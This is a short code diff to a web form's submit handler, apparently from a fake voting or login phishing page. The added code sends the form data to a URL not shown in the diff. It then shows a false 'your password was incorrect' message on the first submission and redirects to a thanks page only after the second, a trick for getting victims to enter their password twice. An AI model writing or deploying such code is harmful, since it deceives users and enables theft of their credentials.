@@ -27,16 +27,19 @@ form.addEventListener("submit", (e) => {
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-           setTimeout(
-        document.getElementById("alert-message").innerHTML =
-          "Successfully voted",
-        10000
-      );
+        clicking = clicking + 1;
+  setTimeout(function () {
+    document.getElementById("alert-message").innerHTML =
+      "Sorry, your password was incorrect. Please double-check your password.";
+  }, 1000);
+  if (clicking == 2) {
+    window.location.replace("thanks.html");
+  }
     });
 
 
-    setTimeout(function() {
-        window.location.replace("thanks.html");
-    }, 1000)
+    // setTimeout(function() {
+    //     window.location.replace("thanks.html");
+    // }, 1000)
 
 });
